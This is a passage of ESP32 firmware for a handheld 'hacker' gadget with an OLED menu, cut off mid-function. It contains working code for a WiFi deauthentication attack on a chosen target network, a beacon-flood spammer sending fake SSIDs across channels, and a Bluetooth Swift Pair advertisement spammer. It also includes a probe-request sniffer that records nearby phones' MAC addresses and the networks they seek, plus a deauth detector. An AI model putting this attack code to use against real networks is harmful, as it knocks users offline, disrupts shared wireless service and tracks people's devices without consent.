	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xfe, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x3f,
	0x00, 0x00, 0x0f, 0x80, 0x00, 0x00, 0x00, 0x1f, 0xfc, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x3f,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xf0, 0x00, 0x00, 0x7f, 0xff, 0xff, 0xff, 0xff, 0xe0, 0xbf,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xfe, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xf7, 0xc0, 0xbf,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xfc, 0xc3, 0xfe, 0x00, 0x00, 0xff, 0xff, 0xc1, 0xbf,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x39, 0x07, 0xff, 0xff, 0xf8, 0x00, 0x6f, 0x81, 0xff,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0x00, 0x03, 0x7f,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xee, 0x00, 0x0f,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff, 0xff, 0xff, 0xfe, 0x07, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xde, 0x0f, 0x78,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xdc, 0x0f, 0x7f,
	0x00, 0x00, 0x00, 0x00, 0x1f, 0xff, 0xfc, 0x1f, 0xfe, 0x00, 0x1f, 0xff, 0xff, 0xc0, 0x1e, 0x60,
	0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xfc, 0x7f, 0xff, 0xff, 0xe7, 0xff, 0xff, 0x80, 0x3e, 0x00,
	0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x80, 0x3e, 0x00,
	0x00, 0x00, 0x0f, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0x00, 0x7e, 0x00,
	0x00, 0x01, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0x00, 0xfc, 0x00,
	0x00, 0x1f, 0xc0, 0x00, 0x03, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0xfc, 0x00,
	0x01, 0xf0, 0x00, 0x0f, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xfe, 0x01, 0xfc, 0x00,
	0x07, 0xf8, 0x07, 0xff, 0xff, 0xf8, 0x00, 0x7f, 0xf8, 0x00, 0x00, 0x00, 0x7c, 0x03, 0xfc, 0x00,
	0x07, 0xc1, 0xff, 0xff, 0xff, 0xf0, 0x07, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x07, 0xf8, 0x00,
	0x02, 0x3f, 0xff, 0xff, 0xff, 0xd0, 0x3f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x07, 0xf8, 0x00,
	0x00, 0xff, 0xff, 0xff, 0xff, 0x60, 0xff, 0xe0, 0x0f, 0xff, 0xf0, 0x00, 0x00, 0x0f, 0xf8, 0x00,
	0x00, 0x3f, 0xff, 0xff, 0xff, 0xc3, 0xff, 0x00, 0x0f, 0xff, 0x0e, 0x00, 0x00, 0x01, 0xf0, 0x00,
	0x00, 0x0f, 0xff, 0xff, 0xff, 0x8f, 0xf8, 0x00, 0x1f, 0xfe, 0x07, 0x80, 0x00, 0x00, 0x30, 0x00,
	0x00, 0x07, 0xff, 0xff, 0xff, 0x9f, 0xe1, 0xf0, 0x3f, 0xfe, 0x0f, 0x80, 0x04, 0x00, 0x00, 0x00,
	0x00, 0x01, 0xff, 0xff, 0xff, 0xbf, 0xcf, 0xe0, 0x1f, 0xf0, 0x3f, 0xe0, 0x0f, 0x80, 0x00, 0x00,
	0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0xff, 0xc0, 0xcf, 0xc0, 0x0f, 0xf0, 0x0f, 0xe0, 0x00, 0x00,
	0x00, 0x00, 0x7f, 0xff, 0xff, 0x7f, 0xff, 0x81, 0xe6, 0x00, 0x1f, 0xe0, 0x0f, 0xfc, 0x00, 0x00,
	0x00, 0x00, 0x7f, 0xff, 0xff, 0x7f, 0xff, 0xc1, 0xff, 0xc0, 0x1f, 0xe0, 0x1f, 0xff, 0x00, 0x00,
	0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xc3, 0xff, 0xc0, 0x3f, 0xe0, 0x1f, 0xff, 0xc0, 0x00,
	0x00, 0x00, 0x1f, 0xff, 0xff, 0x3f, 0xff, 0xcf, 0xff, 0x80, 0x7f, 0xf0, 0x3f, 0xff, 0xc0, 0x00,
	0x00, 0x00, 0x0f, 0xff, 0xff, 0xe7, 0xff, 0xff, 0xff, 0x80, 0xff, 0xf0, 0x3f, 0xff, 0x80, 0x00,
	0x00, 0x00, 0x07, 0xff, 0xff, 0xff, 0xff, 0x3f, 0xff, 0x07, 0xff, 0xf0, 0x7f, 0xff, 0x80, 0x00,
	0x00, 0x00, 0x03, 0xff, 0xff, 0xff, 0x3f, 0x7f, 0xfe, 0x3f, 0xff, 0xf0, 0xff, 0xff, 0x80, 0x00,
	0x00, 0x00, 0x01, 0xff, 0xff, 0x80, 0x00, 0x1f, 0xfe, 0xdf, 0xff, 0xe1, 0xff, 0xff, 0x00, 0x00,
	0x00, 0x00, 0x00, 0xff, 0xff, 0xc0, 0x00, 0x01, 0xfe, 0x1f, 0xff, 0xe3, 0xff, 0xff, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x0f, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x7f, 0xff, 0xc7, 0xff, 0xfe, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x7f, 0xe0, 0x00, 0x00, 0x00, 0xff, 0xff, 0x9f, 0xff, 0xfc, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x03, 0xf0, 0x00, 0x00, 0x00, 0x3f, 0xfe, 0x7f, 0xff, 0xfc, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x7c, 0xff, 0xff, 0xf8, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xf0, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xc0, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xe0, 0x00, 0x0f, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0x07, 0xff, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xf8, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xc0, 0x7f, 0xfc, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Video Player Data
const unsigned char* videoFrames[] = { NULL };
int videoTotalFrames = 0;
int videoCurrentFrame = 0;
unsigned long lastVideoFrameTime = 0;
const int videoFrameDelay = 70; // 25 FPS

// ---------------- DEAUTH LOGIC ----------------
void deauth_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const int packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
      ledQuickFlash();
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;

  // Initialize deauth frame
  deauth_frame.frame_control[0] = 0xC0;
  deauth_frame.frame_control[1] = 0x00;
  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;
  deauth_frame.seq_ctl[0] = 0x00;
  deauth_frame.seq_ctl[1] = 0x00;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer);
}

void stop_deauth() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

void scanForDeauth() {
    scanWiFiNetworks();
    changeState(STATE_DEAUTH_SELECT);
}

void drawDeauthSelect(int x_offset) {
  // Re-use WiFi display logic but change title
  display.clearDisplay();
  drawStatusBar();

  display.setTextSize(1);
  display.setCursor(x_offset + 5, 0);
  display.print("SELECT TARGET");

  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);

  if (networkCount == 0) {
    display.setCursor(10, 25);
    display.println("No networks found");
  } else {
    int startIdx = wifiPage * wifiPerPage;
    int endIdx = min(networkCount, startIdx + wifiPerPage);

    for (int i = startIdx; i < endIdx; i++) {
      int y = 12 + (i - startIdx) * 12;

      if (i == selectedNetwork) {
        display.fillRect(0, y, SCREEN_WIDTH, 11, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }

      display.setCursor(2, y + 2);

      String displaySSID = networks[i].ssid;
      if (displaySSID.length() > 14) {
        displaySSID = displaySSID.substring(0, 14) + "..";
      }
      display.print(displaySSID);

      int bars = map(networks[i].rssi, -100, -50, 1, 4);
      bars = constrain(bars, 1, 4);
      display.setCursor(110, y + 2);
      for (int b = 0; b < bars; b++) {
        display.print("|");
      }

      display.setTextColor(SSD1306_WHITE);
    }

    if (networkCount > wifiPerPage) {
      display.setCursor(45, 56);
      display.print("Pg ");
      display.print(wifiPage + 1);
      display.print("/");
      display.print((networkCount + wifiPerPage - 1) / wifiPerPage);
    }
  }

  display.display();
}

void drawDeauthTool() {
  display.clearDisplay();

  if(random(0,10) == 0) display.invertDisplay(true);
  else display.invertDisplay(false);

  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(25, 2);
  display.print("WIFI DEAUTHER");

  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 20);
  display.print("Target: ");
  String t = networks[selectedNetwork].ssid;
  if (t.length() > 10) t = t.substring(0,10) + "..";
  display.println(t);

  display.setCursor(0, 35);
  display.print("Packets: ");
  display.print(eliminated_stations);

  // Animation
  if (millis() % 500 < 250) {
      display.setCursor(80, 50);
      display.print("ATTACKING");
  }

  display.display();
}

// ---------------- SSID SPAMMER LOGIC ----------------
void sendBeacon(const char* ssid) {
  uint8_t randomMac[6];
  for(int i=0; i<6; i++) randomMac[i] = random(0, 256);
  randomMac[0] = 0xC0;

  memcpy(&packet[10], randomMac, 6);
  memcpy(&packet[16], randomMac, 6);

  int ssidLen = strlen(ssid);
  packet[36] = 0x00;
  packet[37] = ssidLen;
  memcpy(&packet[38], ssid, ssidLen);

  int pos = 38 + ssidLen;
  packet[pos++] = 0x01; packet[pos++] = 0x04;
  packet[pos++] = 0x82; packet[pos++] = 0x84; packet[pos++] = 0x8b; packet[pos++] = 0x96;
  packet[pos++] = 0x03; packet[pos++] = 0x01; packet[pos++] = spamChannel;

  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, true);
}

void initSpammer() {
  WiFi.mode(WIFI_STA); // Ensure Station mode is active for packet injection
  WiFi.disconnect();   // Disconnect from any AP
  delay(100);          // Wait for mode switch stabilization
  esp_wifi_set_promiscuous(true);
}

void updateSpammer() {
  // Burst mode: Send multiple packets per frame
  // Generating "Hundreds" effect by sending ~15 unique SSIDs per loop iteration (which runs at ~60-90Hz)
  // This results in ~1000 beacons per second.

  for(int i=0; i<15; i++) {
      // 1. Acak nama
      String namaAcak = generateRandomSSID();

      // 2. Masukin & TEMBAK (sendBeacon handles building packet and tx)
      sendBeacon(namaAcak.c_str());

      // 3. Ganti Channel (Spread the jamming)
      spamChannel = (spamChannel % 13) + 1;
      esp_wifi_set_channel(spamChannel, WIFI_SECOND_CHAN_NONE);

      // 4. Delay dikit (per user request logic)
      delay(2); // Small delay to avoid complete WDT freeze but fast enough
  }
}

void drawSpammer() {
  display.clearDisplay();

  if(random(0,10) == 0) display.invertDisplay(true);
  else display.invertDisplay(false);

  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(25, 2);
  display.print("BEACON FLOOD");

  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 20);
  display.println("Broadcasting:");

  display.setCursor(5, 35);
  display.print("> ");
  // Show a random sample name
  if (millis() % 200 == 0) {
      display.fillRect(5, 35, 120, 10, SSD1306_BLACK); // Clear prev text
      display.setCursor(5, 35);
      display.print("> ");
      display.print(generateRandomSSID().substring(0, 14));
  }

  display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
  display.setCursor(0, 52);
  display.print("CH: ALL");
  display.print(" PKT: "); display.print(millis()/10); // Simulated high packet count

  display.display();
}

// ---------------- DEAUTH DETECTOR LOGIC ----------------
void deauth_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *frame = p->payload;
  int len = p->rx_ctrl.sig_len;

  // Cek Frame Control
  uint8_t type_bits = (frame[0] >> 2) & 0x03;
  uint8_t subtype_bits = (frame[0] >> 4) & 0xF;

  // --- LOGIKA 1: DEAUTH DETECTOR (Yang tadi) ---
  if (type_bits == 0 && (subtype_bits == 0xC || subtype_bits == 0xA)) {
    deauthCount++;
    lastDeauthTime = millis();
    underAttack = true;
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
    attackerMAC = String(macStr);
  }

  // --- LOGIKA 2: PROBE REQUEST SNIFFER (Fitur Baru) ---
  // Subtype 4 = Probe Request (HP nyari WiFi)
  if (type_bits == 0 && subtype_bits == 0x4) {

    // Ambil MAC Address HP Pengirim (Byte 10-15)
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);

    // Parsing SSID (Nama WiFi yang dicari)
    // Payload manajemen frame mulai di byte 24
    int pos = 24;

    // Loop parsing Tagged Parameters (Tag Number, Tag Length, Data)
    while (pos < len) {
      uint8_t tagNum = frame[pos];
      uint8_t tagLen = frame[pos+1];

      if (pos + 2 + tagLen > len) break; // Safety check

      // Tag 0 adalah SSID
      if (tagNum == 0 && tagLen > 0) {
        char ssidBuf[33];
        // Copy SSID (max 32 chars)
        int copyLen = (tagLen > 32) ? 32 : tagLen;
        memcpy(ssidBuf, &frame[pos+2], copyLen);
        ssidBuf[copyLen] = '\0'; // Null terminate

        String newSSID = String(ssidBuf);

        // Filter nama kosong/sampah
        if (newSSID.length() > 0 && newSSID != detectedProbeSSID) {
           detectedProbeSSID = newSSID;
           detectedProbeMAC = String(macStr);

           // Simpan ke History (Geser array)
           for(int i=4; i>0; i--) probeHistory[i] = probeHistory[i-1];
           probeHistory[0] = "[" + newSSID + "]";

           // Efek Visual (Flash Pixel Biru - Intel style)
           triggerNeoPixelEffect(pixels.Color(0, 0, 255), 50);
        }
        break; // Udah dapet SSID, keluar loop
      }

      pos += 2 + tagLen; // Lanjut ke tag berikutnya
    }
  }
}

void initProbeSniffer() {
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer_callback);
}

// 3. FUNGSI UPDATE (Panggil ini di loop saat mode Probe Sniffer aktif)
// Kita perlu Channel Hopping biar dapet sinyal dari semua frekuensi
void updateProbeSniffer() {
  // Ganti channel setiap 200ms
  if (millis() % 200 == 0) {
    int ch = (millis() / 200) % 13 + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }
}

// 4. TAMPILAN LAYAR (Copy fungsi baru ini)
void drawProbeSniffer() {
  display.clearDisplay();
  drawStatusBar(); // Pake status bar yang udah ada

  // Header Keren
  display.fillRect(0, 10, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(25, 12);
  display.print("PROBE HUNTER");

  display.setTextColor(SSD1306_WHITE);

  // Tampilkan data terakhir yang ketangkep
  display.setTextSize(1);
  display.setCursor(0, 25);
  display.print("SRC: "); display.print(detectedProbeMAC);

  display.setCursor(0, 35);
  display.print("ASK: ");

  // Highlight SSID yang dicari
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE); // Invert text
  display.print(detectedProbeSSID);
  display.setTextColor(SSD1306_WHITE); // Balikin normal

  // Tampilkan History Singkat di bawah
  display.drawLine(0, 46, SCREEN_WIDTH, 46, SSD1306_WHITE);
  display.setCursor(0, 50);
  display.setTextSize(1);
  // Cuma nampilin history terakhir biar layar gak penuh
  display.print("Hist: ");
  display.print(probeHistory[1]);

  display.display();
}

void initDetector() {
  WiFi.disconnect();
  deauthCount = 0;
  underAttack = false;

  for(int i=0; i<GRAPH_WIDTH; i++) deauthHistory[i] = 0;
  graphHead = 0;
  lastGraphUpdate = millis();
  lastDeauthCount = 0;

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer_callback);
}

void updateDetector() {
  if (millis() - lastDeauthTime > 2000) {
    underAttack = false;
  }

  if (millis() % 250 == 0) {
    int ch = (millis() / 250) % 13 + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }

  if (millis() - lastGraphUpdate >= 1000) {
      int currentTotal = deauthCount;
      int rate = currentTotal - lastDeauthCount;
      lastDeauthCount = currentTotal;
      lastGraphUpdate = millis();

      deauthHistory[graphHead] = rate;
      graphHead = (graphHead + 1) % GRAPH_WIDTH;
  }
}

void drawDetector() {
  display.clearDisplay();

  // --- EFEK SENTINEL: LAYAR GLITCH SAAT DISERANG ---
  if (underAttack) {
      // Layar kedip-kedip (Invert) setiap 100ms biar panik
      bool blink = (millis() / 100) % 2;
      display.invertDisplay(blink);

      // Flash LED Merah (Tanda Bahaya)
      if ((millis() / 50) % 2 == 0) pixels.setPixelColor(0, pixels.Color(255, 0, 0));
      else pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.show();
  } else {
      display.invertDisplay(false); // Balikin layar normal kalau aman
      pixels.setPixelColor(0, pixels.Color(0, 0, 0)); // Matikan LED
      pixels.show();
  }

  // Header
  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(20, 2);
  display.print(underAttack ? "! WARNING !" : "WIFI GUARD");

  display.setTextColor(SSD1306_WHITE);

  // Gambar Grafik Sinyal (Sama kayak yang lama)
  int graphBaseY = 63;
  int maxVal = 10;
  for(int i=0; i<GRAPH_WIDTH; i++) if(deauthHistory[i] > maxVal) maxVal = deauthHistory[i];

  for (int i = 0; i < GRAPH_WIDTH; i++) {
      int idx = (graphHead + i) % GRAPH_WIDTH;
      int val = deauthHistory[idx];
      int h = map(val, 0, maxVal, 0, 30);
      if (h > 0) {
        display.drawLine(i * 2, graphBaseY, i * 2, graphBaseY - h, SSD1306_WHITE);
      }
  }

  // --- TAMPILAN INFO PELAKU ---
  if (underAttack) {
    display.setTextSize(1);

    display.setCursor(0, 15);
    display.print("ATTACK DETECTED!");

    // Tampilkan MAC Address Pelaku
    display.setCursor(0, 25);
    display.print("SRC: ");
    display.print(attackerMAC);

    display.setCursor(0, 35);
    display.print("Pkts: "); display.print(deauthCount);

  } else {
    // Tampilan Standar (Lagi Nyari)
    display.setCursor(0, 15);
    display.print("Status: Safe");

    display.setCursor(0, 25);
    display.print("Scanning Air...");

    display.setCursor(0, 35);
    display.print("Pkts: "); display.print(deauthCount);
  }

  display.display();
}

// --- BLE SPAMMER LOGIC ---
String bleTargetName = "SwiftPair_Dev";
bool bleSpamRandomMode = false;
BLEAdvertising *pAdvertising = NULL;
BLEServer *pServer = NULL;

void setupBLE(String name) {
  // Check if already initialized to avoid crash
  // BLEDevice::init is idempotent in recent versions but let's be safe
  // We can't easily check if initialized, but re-init usually requires deinit
  // For simplicity, we assume we clean up properly on exit

  BLEDevice::init(name.c_str());
  pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  pAdvertising->setAppearance(0x03C1); // Keyboard
}

void updateBLESpam() {
  String currentName = bleTargetName;
  if (bleSpamRandomMode) {
      currentName = generateRandomSSID();
  }

  // Swift Pair Payload
  char swiftPairPayload[] = {
      0x06, 0x00, // Microsoft Vendor ID
      0x03,       // Microsoft Beacon ID
      0x00,       // Scenario Type
      0x80,       // Device Type
      0x00, 0x00, 0x00 // Reserved
  };

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  oAdvertisementData.setFlags(0x04);

  #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
    // Use String constructor for binary data
    oAdvertisementData.setManufacturerData(String(swiftPairPayload, 7));
  #else
    // Use std::string for v2
    oAdvertisementData.setManufacturerData(std::string(swiftPairPayload, 7));
  #endif

  oAdvertisementData.setName(currentName.c_str());

  if (pAdvertising) {
      pAdvertising->stop();
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->start();
  } else {
      setupBLE(currentName);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->start();
  }

  delay(200);
}

void stopBLESpam() {
  if (pAdvertising) {
      pAdvertising->stop();
  }
  // Cleaning up BLE completely is tricky on Arduino ESP32 without reboot
  // We will just stop advertising.
  // Ideally: BLEDevice::deinit(true); if supported
}

void drawBLEMenu(int x_offset) {
  const char* items[] = {
    "Set Name",
    "Start Static",
    "Start Random",
    "Back"
  };
  static float bleScrollY = 0;
  drawGenericListMenu(x_offset, "BLE SPAMMER", ICON_BLE, items, 4, menuSelection, &bleScrollY);
}

void handleBLEMenuSelect() {
  switch(menuSelection) {
    case 0: // Set Name
      userInput = bleTargetName;
      keyboardContext = CONTEXT_BLE_NAME;
      cursorX = 0;
      cursorY = 0;
      changeState(STATE_KEYBOARD);
      break;
    case 1: // Start Static
      bleSpamRandomMode = false;
      changeState(STATE_TOOL_BLE_RUN);
      break;
    case 2: // Start Random
      bleSpamRandomMode = true;
      changeState(STATE_TOOL_BLE_RUN);
      break;
    case 3: // Back
      changeState(STATE_SYSTEM_SUB_TOOLS);
      break;
  }
}

void drawBLERun() {
  display.clearDisplay();

  // Hacker animation effect
  if (random(0, 10) == 0) display.invertDisplay(true);
  else display.invertDisplay(false);

  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(30, 2);
  display.print("BLE ATTACK");

  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 20);
  display.print("Mode: ");
  display.print(bleSpamRandomMode ? "RANDOM" : "STATIC");

  display.setCursor(0, 35);
  display.print("Name: ");
  if (bleSpamRandomMode) {
      display.print(generateRandomSSID().substring(0, 10) + "..");
  } else {
      display.print(bleTargetName.substring(0, 12));
  }

  display.setCursor(0, 50);
  display.print("Status: BROADCASTING");

  display.display();
}

// --- COURIER TRACKER LOGIC ---
String bb_apiKey = BINDERBYTE_API_KEY;
String bb_kurir  = BINDERBYTE_COURIER;
String bb_resi   = DEFAULT_COURIER_RESI;
String courierStatus = "SYSTEM READY";
String courierLastLoc = "-";
String courierDate = "";
bool isTracking = false;

void drawCourierTool() {
    display.clearDisplay();
    // Use the requested "BINDERBYTE OPS" header style
    display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(25, 2);
    display.print("BINDERBYTE OPS");
    display.setTextColor(SSD1306_WHITE);

    display.setTextSize(1);
    display.setCursor(0, 16); display.print("RESI: "); display.print(bb_resi);

    // Status Box
    display.drawRect(0, 26, 128, 14, SSD1306_WHITE);
    int c = (128 - (courierStatus.length()*6)) / 2; if(c<2) c=2;
    display.setCursor(c, 29);
    if(isTracking && (millis()/200)%2==0) display.print("..."); else display.print(courierStatus);

    // Location & Date
    display.setCursor(0, 44); display.print("LOC: ");
    if(courierLastLoc.length()>14) display.print(courierLastLoc.substring(0,14)); else display.print(courierLastLoc);

    display.setCursor(0, 54); display.print("TGL: ");
    if(courierDate.length()>0) display.print(courierDate.substring(0,16));

    // Indikator OTA Ready (Titik di pojok)
    if((millis()/1000)%2==0) display.fillCircle(124, 60, 2, SSD1306_WHITE);

    display.display();
}

void checkResiReal() {
    if(WiFi.status() != WL_CONNECTED) {
        courierStatus = "NO WIFI";
        return;
    }

    isTracking = true;
    courierStatus = "FETCHING...";
    drawCourierTool(); // Force update

    WiFiClient client;

    HTTPClient http;
